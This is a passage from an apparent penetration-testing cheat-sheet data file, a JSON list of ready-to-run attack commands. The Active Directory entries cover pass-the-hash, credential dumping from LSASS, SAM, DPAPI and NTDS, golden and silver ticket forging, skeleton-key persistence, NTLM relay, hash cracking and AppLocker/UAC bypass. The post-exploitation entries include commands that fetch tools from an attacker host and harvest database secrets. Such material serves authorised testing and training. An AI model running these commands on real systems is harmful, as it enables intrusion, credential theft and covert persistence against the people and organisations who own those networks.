              "reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0",
              "xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>",
              "WinRM >>> Low access || Admin",
              "evil-winrm -i <ip> -u <user> -H <hash>",
              "Overpass the Hash / Pass the key (PTK) >>> Admin",
              "Rubeus.exe asktgt /user:victim /rc4:<rc4value>",
              "Rubeus.exe ptt /ticket:<ticket>",
              "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\[cmd.exe||upnpcont.exe]",
              "getTGT.py <domain>/<user> -hashes :<hashes>"
            ]
          },
          {
            "desc": "Kerberos",
            "subdesc": "",
            "cmd": [
              "Pass the Ticket (ccache / kirbi)",
              "Convert Format",
              "ticketConverter.py <kirbi||ccache> <ccache||kirbi>",
              "export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache` >>> Admin",
              "impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket",
              "mimikatz kerberos::ptc \"<ticket>",
              "Rubeus.exe ptt /ticket:<ticket>",
              "proxychains secretsdump.py -k'<domain>'/'<user>'@'<ip>",
              "Modify SPN >>> PassTheTicket",
              "tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice \"<service>/<target>\" #pr 1256",
              "Aeskey >>> Admin",
              "impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)",
              "proxychains secretsdump.py -aesKey <key> '<domain>'/'<user>'@'<ip>"
            ]
          },
          {
            "desc": "Socks (relay)",
            "subdesc": "",
            "cmd": [
              "proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids",
              "proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass` >>> MSSQL",
              "proxychains secretsdump.py -no-pass '<domain>'/'<user>'@'<ip>'` >>> DCSYNC",
              "proxychains smbclient.py -no-pass <user>@<ip>` >>> Search files",
              "proxychains atexec.py  -no-pass  <domain>/<user>@<ip> \"command\"` >>> Authority/System",
              "proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>` >>> Authority/System"
            ]
          },
          {
            "desc": "Certificate (pfx)",
            "subdesc": "",
            "cmd": [
              "unpac the hash",
              "certipy auth -pfx <crt_file> -dc-ip <dc_ip>",
              "gettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass <crt_pass> \"<domain>/<dc_name>\" <tgt.ccache>",
              "getnthash.py -key '<AS-REP encryption key>' '<domain>'/'<dc_name>",
              "Pass the certificate",
              "pkinit",
              "gettgtpkinit.py -cert-pfx \"<pfx_file>\" ^[-pfx-pass  \"<cert-password>\"] \"<fqdn_domain>/<user>\" \"<tgt_ccache_file>",
              "Rubeus.exe asktgt /user:\"<username>\" /certificate:\"<pfx_file>\" [/password:\"<certificate_password>\"] /domain:\"<fqdn-domain>\" /dc:\"<dc>\" /show",
              "certipy auth -pfx <crt_file> -dc-ip <dc_ip>",
              "schannel",
              "certipy auth -pfx <pfx_file> -ldap-shell",
              "add_computer",
              "Set RBCD >>> RBCD",
              "certipy cert -pfx \"<pfx_file>\" -nokey -out \"user.crt",
              "certipy cert -pfx \"<pfx_file>\" -nocert -out \"user.key",
              "passthecert.py -action ldap-shell -crt <user.crt> -key <user.key> -domain <domain> -dc-ip <dc_ip>"
            ]
          },
          {
            "desc": "MSSQL",
            "subdesc": "",
            "cmd": [
              "find mssql access",
              "nxc mssql <ip> -u <user> -p <password> -d <domain>` >>> MSSQL",
              "Users or Computers with SQL admin",
              "MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p` >>> MSSQL",
              "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>",
              "enum_db",
              "enable_xp_cmdshell",
              "xp_cmdshell <cmd>` >>> Low Access",
              "enum_impersonate",
              "exec_as_user <user>` >>> MSSQL",
              "exec_as_login <login>` >>> MSSQL",
              "xp_dir_tree <ip>` >>> COERCE SMB",
              "trustlink",
              "sp_linkedservers",
              "use_link` >>> MSSQL || Trust"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__admin",
        "name": "Admin Access",
        "description": "",
        "commands": [
          {
            "desc": "Extract credentials from LSASS.exe",
            "subdesc": "",
            "cmd": [
              "LSASS as protected process",
              "PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp #before 2022-07-22 update",
              "mimikatz \"!+\" \"!processprotect /process:lsass.exe /remove\" \"privilege::debug\" \"token::elevate\"  \"sekurlsa::logonpasswords\" \"!processprotect  /process:lsass.exe\" \"!-",
              "Extract LSASS secrets  >>> User + Pass || NTLM || PassTheHash || Clear text move",
              "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
              "mimikatz \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\"  \"exit",
              "msf> load kiwi creds_all",
              "nxc smb <ip_range> -u <user> -p <password> -M lsassy",
              "lsassy -d <domain> -u <user> -p <password> <ip>"
            ]
          },
          {
            "desc": "Extract credentials from SAM",
            "subdesc": "NTLM || PassTheHash",
            "cmd": [
              "nxc smb <ip_range> -u <user> -p <password> --sam",
              "msf> hashdump",
              "mimikatz \"privilege::debug\" \"lsadump::sam\" \"exit",
              "secretsdump.py <domain>/<user>:<password>@<ip>",
              "reg save HKLM\\SAM <file>;  reg save HKLM\\SYSTEM <file>",
              "secretsdump.py -system SYSTEM -sam SAM LOCAL",
              "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share",
              "secretsdump.py -system SYSTEM -sam SAM LOCAL",
              "regsecrets.py <domain>/<user>:<password>@<ip>"
            ]
          },
          {
            "desc": "Extract credentials from LSA",
            "subdesc": "MsCache 2 || User + Pass",
            "cmd": [
              "nxc smb <ip_range> -u <user> -p <password> --lsa",
              "mimikatz \"privilege::debug\" \"lsadump::lsa\" \"exit",
              "reg save HKLM\\SECURITY <file>;  reg save HKLM\\SYSTEM <file>",
              "secretsdump.py -system SYSTEM -security SECURITY",
              "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share"
            ]
          },
          {
            "desc": "Extract credentials from DPAPI",
            "subdesc": "",
            "cmd": [
              "DPAPI >>> User + Pass || PassTheHash || Clear text move",
              "nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]",
              "donpapi <domain>/<user>:<password>@<target>",
              "dpapidump.py <domain>/<user>:<password>@<target>",
              "get masterkey",
              "mimikatz \"sekurlsa::dpapi",
              "dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>",
              "lsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeys",
              "dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>",
              "SharpDPAPI.exe triage",
              "Crack users masterkey >>> DPAPImk",
              "copy c:\\users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>",
              "DPAPImk2john.py --preferred <prefered_file>",
              "DPAPImk2john.py -c domain -mk <masterkey> -S <sid>"
            ]
          },
          {
            "desc": "Impersonate",
            "subdesc": "",
            "cmd": [
              "Impersonate >>> ACL || User + Pass",
              "msf> use incognito impersonate_token <domain>\\\\<user>",
              "nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users",
              "nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>",
              "irs.exe list",
              "irs.exe exec -p <pid> -c <command>",
              "Impersonate with adcs >>> NTLM || Pass The Hash / Ticket / Certificate",
              "masky - d <domain> -u <user>  (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>",
              "Impersonate RDP Session >>> RDP",
              "psexec.exe -s -i cmd",
              "query user",
              "tscon.exe <id> /dest:<session_name>"
            ]
          },
          {
            "desc": "Misc",
            "subdesc": "",
            "cmd": [
              "Find Users >>> Username",
              "smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv",
              "Extract Keepass >>> User + Pass",
              "KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll",
              "KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>",
              "Hybrid (Azure AD-Connect) >>> DCSYNC",
              "Dump cleartext password of MSOL Account on ADConnect Server",
              "azuread_decrypt_msol_v2.ps1",
              "nxc smb <ip> -u <user> -p <password> -M msol"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__dom_admin",
        "name": "Domain Admin",
        "description": "",
        "commands": [
          {
            "desc": "Dump ntds.dit",
            "subdesc": "Lateral move || Crack hash",
            "cmd": [
              "nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds",
              "secretsdump.py '<domain>/<user>:<pass>'@<ip>",
              "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q",
              "secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract",
              "msf> windows/gather/credentials/domain_hashdump",
              "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
              "certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>"
            ]
          },
          {
            "desc": "Grab backup Keys",
            "subdesc": "Credentials",
            "cmd": [
              "donpapi collect - H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__trusts",
        "name": "Trusts",
        "description": "",
        "commands": [
          {
            "desc": "Enumeration",
            "subdesc": "",
            "cmd": [
              "nltest.exe /trusted_domains",
              "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",
              "Get-DomainTrust -Domain <domain>",
              "Get-DomainTrustMapping",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trusts",
              "sharphound.exe -c trusts -d <domain>",
              "MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p",
              "Get Domains SID",
              "Get-DomainSID -Domain <domain> Get-DomainSID -Domain <target_domain>",
              "lookupsid.py -domain-sids <domain>/<user>:<password>'@<dc> 0 lookupsid.py -domain-sids <domain>/<user>:<password>'@<target_dc> 0"
            ]
          },
          {
            "desc": "Child->Parent",
            "subdesc": "",
            "cmd": [
              "Trust Key >>> PassTheTicket",
              "mimikatz lsadump::trust /patch",
              "mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt",
              "secretsdump.py -just-dc-user '<parent_domain>$'   <domain>/<user>:<password>@<dc_ip>",
              "ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser",
              "Golden Ticket >>> PassTheTicket",
              "mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt",
              "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt",
              "raiseChild.py <child_domain>/<user>:<password>",
              "ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser",
              "Unconstrained delegation",
              "coerce parent_dc on child_dc domain >>> unconstrained delegation"
            ]
          },
          {
            "desc": "Parent->Child",
            "subdesc": "",
            "cmd": [
              "same as Child to parent"
            ]
          },
          {
            "desc": "External Trust",
            "subdesc": "",
            "cmd": [
              "DomainA <--> DomainB trust (B trust A, A trust B)",
              "from A to B FOREST_TRANSITIVE",
              "password reuse >>> lat move (creds/pth/...)",
              "Foreign group and users >>> ACL",
              "Users with foreign Domain Group Membership",
              "MATCH p=(n:User {domain:\"<DOMAIN.FQDN>\"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p",
              "Group with foreign Domain Group Membership",
              "MATCH p=(n:Group {domain:\"<DOMAIN.FQDN>\"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p",
              "SID History on B >>> PassTheTicket",
              "Golden ticket",
              "mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt",
              "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt",
              "ticketer.py -nthash <krbtgt> -domain-sid <domain_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> fakeuser",
              "Trust ticket",
              "secretsdump.py -just-dc-user '<domainB>' <domainA>/<user>:'<password>'@<dc_a>",
              "ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser",
              "ADCS abuse >>> ADCS",
              "from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL",
              "Unconstrained delegation",
              "coerce dc_b on dc_a >>> unconstrained delegation",
              "DomainA <-- DomainB trust (B trust A / A access B)",
              "Same as double trust, but no unconstrained delegation as B can't connect to A",
              "DomainA --> DomainB trust (A trust B / B access A)",
              "password reuse >>> lat move (creds/pth/...)"
            ]
          },
          {
            "desc": "Mssql links",
            "subdesc": "MSSQL",
            "cmd": [
              "MSSQL trusted links doesn't care of trust link",
              "Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>",
              "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>",
              "trustlink",
              "sp_linkedservers",
              "use_link"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__persistence",
        "name": "Persistence",
        "description": "",
        "commands": [
          {
            "desc": "ADD DA",
            "subdesc": "",
            "cmd": [
              "net group \"domain admins\" myuser /add /domain"
            ]
          },
          {
            "desc": "Golden ticket",
            "subdesc": "",
            "cmd": [
              "ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>",
              "mimikatz \"kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"
            ]
          },
          {
            "desc": "Silver Ticket",
            "subdesc": "",
            "cmd": [
              "mimikatz \"kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt",
              "ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>"
            ]
          },
          {
            "desc": "Directory Service Restore Mode (DSRM)",
            "subdesc": "",
            "cmd": [
              "PowerShell New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD"
            ]
          },
          {
            "desc": "Skeleton Key",
            "subdesc": "",
            "cmd": [
              "mimikatz \"privilege::debug\" \"misc::skeleton\" \"exit\" #password is mimikatz"
            ]
          },
          {
            "desc": "Custom SSP",
            "subdesc": "",
            "cmd": [
              "mimikatz \"privilege::debug\" \"misc::memssp\" \"exit",
              "C:\\Windows\\System32\\kiwissp.log"
            ]
          },
          {
            "desc": "Golden certificate",
            "subdesc": "",
            "cmd": [
              "certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>",
              "certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>"
            ]
          },
          {
            "desc": "Diamond ticket",
            "subdesc": "",
            "cmd": [
              "ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  -user-id <user_id> -groups '512,513,518,519,520' <anyuser>"
            ]
          },
          {
            "desc": "Saphire Ticket",
            "subdesc": "",
            "cmd": [
              "ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password>  -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  'ignored"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__mitm",
        "name": "MITM / Relay",
        "description": "",
        "commands": [
          {
            "desc": "Listen",
            "subdesc": "Hash NTLMv1 or NTLMv2 || Username || Credentials (ldap/http)",
            "cmd": [
              "responder -l <interface> #use --lm to force downgrade",
              "smbclient.py"
            ]
          },
          {
            "desc": "NTLM relay",
            "subdesc": "",
            "cmd": [
              "MS08-068 self relay @CVE@",
              "msf> exploit/windows/smb_smb_relay # windows 2000 / windows server 2008",
              "SMB -> LDAP(S)",
              "NTLMv1",
              "remove mic (no CVE needed)  >>> see LDAP(S)",
              "NTLMv2",
              "Remove mic (CVE-2019-1040) @CVE@ >>> see LDAP(S)",
              "HTTP(S) -> LDAP(S)",
              "Usually from webdav coerce >>> see LDAP(S)",
              "To LDAP(S)",
              "Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)",
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access ` >>> RBCD",
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'` >>> Shadow Credentials",
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>` >>> Domain admin",
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111` >>> LDAP SHELL",
              "To SMB",
              "Relay to SMB (if SMB is not signed)",
              "Find SMB not signed targets (default if not a Domain controler)",
              "nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt",
              "ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks` >>> SMB Socks",
              "To HTTP",
              "Relay to CA web enrollement >>> ESC8",
              "Relay to WSUS >>> WSUS",
              "To MsSQL",
              "ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks` >>> MSSQL Socks",
              "SMB -> NETLOGON",
              "Zero-Logon (safe method) (CVE-202-1472) @CVE@",
              "Relay one dc to another",
              "ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>` >>> DCSYNC"
            ]
          },
          {
            "desc": "Kerberos relay",
            "subdesc": "",
            "cmd": [
              "To HTTP",
              "krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>` >>> ESC8",
              "SMB -> SMB",
              "same as NTLM relay, use krbrelayx.py",
              "SMB -> LDAP(S)",
              "same as NTLM relay, use krbrelayx.py"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__crack_hash",
        "name": "Crack Hashes",
        "description": "",
        "commands": [
          {
            "desc": "LM (299bd128c1101fd6)",
            "subdesc": "",
            "cmd": [
              "john --format=lm hash.txt --wordlist=<rockyou.txt>",
              "hashcat -m 3000 -a 0 hash.txt <rockyou.txt>"
            ]
          },
          {
            "desc": "NT (b4b9b02e6f09a9bd760...)",
            "subdesc": "",
            "cmd": [
              "john --format=nt hash.txt --wordlist=<rockyou.txt>",
              "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>"
            ]
          },
          {
            "desc": "NTLMv1 (user::85D5BC...)",
            "subdesc": "",
            "cmd": [
              "john --format=netntlm hash.txt --wordlist=<rockyou.txt>",
              "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>",
              "crack.sh",
              "[https://crack.sh/](https://crack.sh/)"
            ]
          },
          {
            "desc": "NTLMv2 (user::N46iSNek...)",
            "subdesc": "",
            "cmd": [
              "john --format=netntlmv2 hash.txt --wordlist=<rockyou.txt>",
              "hashcat -m 5600 -a 0 hash.txt <rockyou.txt>"
            ]
          },
          {
            "desc": "Kerberos 5 TGS ($krb5tgs$23$...)",
            "subdesc": "",
            "cmd": [
              "john --format=krb5tgs hash.txt --wordlist=<rockyou.txt>",
              "hashcat -m 13100 -a 0 hash.txt <rockyou.txt>"
            ]
          },
          {
            "desc": "Kerberos 5 TGS AES128 ($krb5tgs$17...)",
            "subdesc": "",
            "cmd": [
              "hashcat -m 19600 -a 0 hash.txt <rockyou.txt>"
            ]
          },
          {
            "desc": "Kerberos ASREP ($krb5asrep$23...)",
            "subdesc": "",
            "cmd": [
              "hashcat -m 18200 -a 0 hash.txt <rockyou.txt>"
            ]
          },
          {
            "desc": "MSCache 2 (very slow) ($DCC2$10240...)",
            "subdesc": "",
            "cmd": [
              "hashcat -m 2100 -a 0 hash.txt <rockyou.txt>"
            ]
          },
          {
            "desc": "Timeroast hash ($sntp-ms$...)",
            "subdesc": "",
            "cmd": [
              "hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l"
            ]
          },
          {
            "desc": "pxe hash ($sccm$aes128$...)",
            "subdesc": "",
            "cmd": [
              "hashcat -m 19850 -a 0 hash.txt <rockyou.txt>"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__low_access",
        "name": "Low Access Privesc",
        "description": "",
        "commands": [
          {
            "desc": "Bypass Applocker",
            "subdesc": "Low access (without applocker)",
            "cmd": [
              "Get-Applocker infos",
              "Get-ChildItem -Path HKLM:\\SOFTWARE\\Policies \\Microsoft\\Windows\\SrpV2\\Exe (dll/msi/...)",
              "files in writables paths",
              "C:\\Windows\\Temp",
              "C:\\Windows\\Tasks",
              "installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe",
              "mshta.exe my.hta",
              "MsBuild.exe pshell.xml"
            ]
          },
          {
            "desc": "UAC bypass",
            "subdesc": "Admin",
            "cmd": [
              "Fodhelper.exe",
              "wsreset.exe",
              "msdt.exe"
            ]
          },
          {
            "desc": "Auto Enum",
            "subdesc": "Admin",
            "cmd": [
              "winPEASany_ofs.exe",
              ".\\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended"
            ]
          },
          {
            "desc": "Search files",
            "subdesc": "User Account",
            "cmd": [
              "findstr /si 'pass' *.txt *.xml *.docx *.ini"
            ]
          },
          {
            "desc": "Exploit",
            "subdesc": "Admin",
            "cmd": [
              "SMBGhost CVE-2020-0796 @CVE@",
              "CVE-2021-36934 (HiveNightmare/SeriousSAM) @CVE@",
              "vssadmin list shadows"
            ]
          },
          {
            "desc": "Webdav",
            "subdesc": "HTTP Coerce",
            "cmd": [
              "open file <file>.searchConnector-ms",
              "dnstool.py -u <domain>\\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>",
              "petitpotam.py -u '<user>' -p <pass> -d '<domain>' \"attacker@80/random.txt\" <ip>"
            ]
          },
          {
            "desc": "Kerberos Relay",
            "subdesc": "Admin",
            "cmd": [
              "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>",
              "KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name>-cp <omputer_pass>"
            ]
          },
          {
            "desc": "From Service account (SEImpersonate)",
            "subdesc": "Admin",
            "cmd": [
              "RoguePatato @CVE@",
              "GodPotato @CVE@",
              "PrintSpoofer @CVE@",
              "RemotePotato0"
            ]
          }
        ]
      }
    ]
  },

  /* ─── Phase 5: Post-Exploitation ─────────────────────────────── */
  {
    "id": "post_exploitation",
    "name": "Post-Exploitation",
    "optional": false,
    "items": [
      {
        "id": "post-1",
        "name": "Linux: Basic Enumeration",
        "description": "Gather baseline Linux host data.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "whoami && id",
              "uname -a",
              "ip a"
            ]
          }
        ]
      },
      {
        "id": "post-2",
        "name": "Linux: Run LinPEAS",
        "description": "Automated Linux privesc checks.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "wget http://<LHOST>/linpeas.sh -O /tmp/linpeas.sh",
              "chmod +x /tmp/linpeas.sh"
            ]
          }
        ]
      },
      {
        "id": "post-3",
        "name": "Linux: Sudo Permissions",
        "description": "Assess sudo abuse opportunities.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "sudo -l"
            ]
          }
        ]
      },
      {
        "id": "post-4",
        "name": "Linux: SUID/SGID Binaries",
        "description": "Identify SUID/SGID escalation vectors.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "find / -perm -4000 -type f 2>/dev/null"
            ]
          }
        ]
      },
      {
        "id": "post-5",
        "name": "Linux: Capabilities",
        "description": "Check capability-based privilege paths.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "getcap -r / 2>/dev/null"
            ]
          }
        ]
      },
      {
        "id": "post-6",
        "name": "Linux: Cron Jobs",
        "description": "Scheduled task discovery.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "crontab -l",
              "cat /etc/crontab"
            ]
          }
        ]
      },
      {
        "id": "post-7",
        "name": "Linux: Writable Files & Dirs",
        "description": "Writable paths for escalation.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "find / -writable -type f 2>/dev/null"
            ]
          }
        ]
      },
      {
        "id": "post-8",
        "name": "Linux: Network & Internal Services",
        "description": "Internal pivots and services.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "ss -tlnp",
              "ip route",
              "cat /etc/hosts"
            ]
          }
        ]
      },
      {
        "id": "post-9",
        "name": "Linux: Kernel Exploits",
        "description": "Kernel exploit triage.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "uname -r",
              "searchsploit linux kernel <VERSION>"
            ]
          }
        ]
      },
      {
        "id": "post-10",
        "name": "Linux: NFS Shares",
        "description": "NFS misconfiguration checks.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "showmount -e <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "post-11",
        "name": "Windows: Basic Enumeration",
        "description": "Baseline Windows host profile.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "whoami /all",
              "systeminfo",
              "ipconfig /all"
            ]
          }
        ]
      },
      {
        "id": "post-12",
        "name": "Windows: Run WinPEAS",
        "description": "Automated Windows privesc checks.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "certutil -urlcache -split -f http://<LHOST>/winPEASx64.exe C:\\Temp\\winpeas.exe"
            ]
          }
        ]
      },
      {
        "id": "post-13",
        "name": "Windows: Service Misconfigurations",
        "description": "Service configuration abuse checks.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "sc query",
              "sc qc <SERVICE_NAME>"
            ]
          }
        ]
      },
      {
        "id": "post-14",
        "name": "Windows: Token Impersonation",
        "description": "Check impersonation opportunities.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "whoami /priv"
            ]
          }
        ]
      },
      {
        "id": "post-15",
        "name": "Windows: Stored Credentials",
        "description": "Stored secret discovery.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "cmdkey /list"
            ]
          }
        ]
      },
      {
        "id": "post-16",
        "name": "Windows: AlwaysInstallElevated",
        "description": "MSI privilege escalation path.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
            ]
          }
        ]
      },
      {
        "id": "post-17",
        "name": "Windows: Pass the Hash",
        "description": "Lateral movement with NTLM hashes.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "impacket-psexec admin@<TARGET_IP> -hashes :<NTLM_HASH>"
            ]
          }
        ]
      },
      {
        "id": "post-18",
        "name": "Windows: Kerberoasting",
        "description": "Service ticket extraction and cracking.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request"
            ]
          }
        ]
      },
      {
        "id": "post-19",
        "name": "Linux: NFS Pivot Validation (111/2049)",
        "description": "Validate NFS pivot opportunities after foothold.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "showmount -e <TARGET_IP>",
              "mount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs"
            ]
          }
        ]
      },
      {
        "id": "post-20",
        "name": "Linux: Harvest DB Secrets (3306/5432/6379/27017)",
        "description": "Extract creds for lateral movement into data services.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "grep -R \"password|passwd|DB_\" /var/www /opt /home 2>/dev/null",
              "cat /etc/*conf 2>/dev/null | grep -Ei \"mysql|postgres|redis|mongo\""
            ]
          }
        ]
      },
      {
        "id": "post-21",
        "name": "Windows: AD Enumeration (88/389/636/3268/3269)",
        "description": "Deep AD and trust/path analysis from compromised host.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "nltest /dclist:<DOMAIN>",
              "Get-ADDomain",
              "Get-ADUser -Filter * -Properties *"
            ]
          }
        ]
      },
      {
        "id": "post-22",
        "name": "Windows: SMB Lateral Movement Prep (139/445)",
        "description": "Enumerate reachable hosts and admin shares.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "net view /domain",
              "net use \\<TARGET_IP>C$ /user:<DOMAIN>\\<USER> <PASS>"
            ]
          }
        ]
      },
      {
        "id": "post-23",
        "name": "Windows: WinRM Lateral Movement (5985/5986)",
        "description": "Validate PowerShell remoting movement paths.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "Test-WSMan <TARGET_IP>",
              "evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>"
            ]
          }
        ]
      },
      {
        "id": "post-24",
        "name": "Loot: Flags & Sensitive Files",
